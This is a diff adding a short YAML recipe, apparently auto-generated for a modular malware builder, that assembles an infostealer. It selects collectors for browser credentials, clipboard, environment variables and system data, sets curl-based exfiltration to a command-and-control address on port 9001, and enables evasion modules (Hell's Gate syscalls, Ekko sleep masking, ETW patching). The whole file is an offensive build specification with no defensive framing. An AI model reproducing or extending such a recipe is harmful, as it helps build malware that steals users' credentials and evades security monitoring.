@@ -1,0 +1,23 @@
+name: infostealer_cs_staged_curl_v1
+description: Auto-generated recipe by Hermes (c)
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/system_info
+- collectors/processes_api
+- collectors/browser_chromium
+- collectors/clipboard
+- collectors/env_vars
+exfil: exfil/curl_lolbin
+arch: arch/staged
+resources: true
+api_resolve: api_resolve/api_hash_djb2
+evasion:
+- evasion/hells_gate
+- evasion/sleep_ekko
+- evasion/etw_patch
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
